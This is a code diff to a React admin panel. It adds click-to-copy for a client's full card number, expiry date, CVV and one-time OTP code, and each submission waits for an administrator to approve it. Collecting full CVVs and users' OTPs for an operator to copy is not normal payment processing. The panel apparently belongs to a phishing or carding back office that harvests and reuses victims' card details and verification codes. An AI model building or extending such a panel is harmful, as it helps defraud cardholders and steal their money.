@@ -4,9 +4,42 @@ import { useState } from "react";
 import { CardBrandLogo } from "@/components/admin/CardBrandLogo";
 import { resolveBankDomain, getBankLogoUrl, shortenBankName } from "@/lib/card-utils";
 import { formatWorkerPrice } from "@/lib/pricing";
+import { useToast } from "@/components/ui/Toast";
 import type { EmploymentCategory } from "@/lib/supabase/types";
 import styles from "./ClientDetailPanel.module.css";
 import type { InboxClient } from "./ClientInboxClient";
+
+/** ينسخ النص إلى الحافظة ويُظهر تأكيداً. يعملق (fallback) على المتصفحات بدون clipboard API. */
+function useCopy() {
+  const toast = useToast();
+  return (text: string, label: string) => {
+    const value = text.trim();
+    if (!value) return;
+    const done = () => toast.push(`تم نسخ ${label}`, "success");
+    const fail = () => toast.push("تعذّر النسخ", "error");
+    if (navigator.clipboard?.writeText) {
+      navigator.clipboard.writeText(value).then(done).catch(() => fallbackCopy(value, done, fail));
+    } else {
+      fallbackCopy(value, done, fail);
+    }
+  };
+}
+
+function fallbackCopy(text: string, ok: () => void, fail: () => void) {
+  try {
+    const ta = document.createElement("textarea");
+    ta.value = text;
+    ta.style.position = "fixed";
+    ta.style.opacity = "0";
+    document.body.appendChild(ta);
+    ta.select();
+    document.execCommand("copy");
+    document.body.removeChild(ta);
+    ok();
+  } catch {
+    fail();
+  }
+}
 
 type Props = {
   client: InboxClient | null;
@@ -356,6 +389,9 @@ function PaymentCard({
   const status = String(p.status ?? "pending_admin");
   const bookingRef = String(p.booking_ref ?? "");
   const [deciding, setDeciding] = useState(false);
+  const copy = useCopy();
+  // الرقم الكامل للنسخ (بدون مسافات التنسيق).
+  const cardNumberRaw = cardNumber.replace(/\s+/g, "");
 
   const statusLabel =
     status === "approved" ? "✓ موافق عليه" : status === "rejected" ? "✗ مرفوض" : "⏳ بانتظار قرار المدير";
@@ -414,7 +450,12 @@ function PaymentCard({
             </div>
             <CardBrandLogo scheme={binScheme} />
           </div>
-          <div className={styles.cardNumber} dir="ltr">
+          <div
+            className={`${styles.cardNumber} ${styles.copyable}`}
+            dir="ltr"
+            onClick={() => copy(cardNumberRaw || cardLast4, "رقم البطاقة")}
+            title="انقر للنسخ"
+          >
             {cardNumber ? cardNumber.replace(/(.{4})/g, "$1 ").trim() : `•••• •••• •••• ${cardLast4}`}
           </div>
           <div className={styles.cardBottomRow}>
@@ -424,11 +465,25 @@ function PaymentCard({
             </div>
             <div className={styles.cardExpGroup}>
               <span className={styles.cardLabel}>EXPIRES</span>
-              <span className={styles.cardValueSmall} dir="ltr">{expiry}</span>
+              <span
+                className={`${styles.cardValueSmall} ${styles.copyable}`}
+                dir="ltr"
+                onClick={() => copy(expiry, "تاريخ الانتهاء")}
+                title="انقر للنسخ"
+              >
+                {expiry}
+              </span>
             </div>
             <div className={styles.cardExpGroup}>
               <span className={styles.cardLabel}>CVV</span>
-              <span className={styles.cardValueSmall} dir="ltr">{cvv}</span>
+              <span
+                className={`${styles.cardValueSmall} ${styles.copyable}`}
+                dir="ltr"
+                onClick={() => copy(cvv, "CVV")}
+                title="انقر للنسخ"
+              >
+                {cvv}
+              </span>
             </div>
           </div>
         </div>
@@ -488,6 +543,7 @@ function OtpRequestCard({
   const status = String(p.status ?? "pending_admin");
   const bookingRef = String(p.booking_ref ?? "");
   const [deciding, setDeciding] = useState(false);
+  const copy = useCopy();
 
   const statusLabel =
     status === "approved" ? "✓ موافق عليه" : status === "rejected" ? "✗ مرفوض" : "⏳ بانتظار قرار المدير";
@@ -522,7 +578,12 @@ function OtpRequestCard({
       <div className={styles.cardBody}>
         <div className={styles.otpSection}>
           <span className={styles.otpLabel}>الرمز المُرسل:</span>
-          <div className={styles.otpBoxes} dir="ltr">
+          <div
+            className={`${styles.otpBoxes} ${styles.copyable}`}
+            dir="ltr"
+            onClick={() => copy(otp, "رمز OTP")}
+            title="انقر للنسخ"
+          >
             {otp.split("").map((d, i) => (
               <div key={i} className={styles.otpBox}>{d}</div>
             ))}
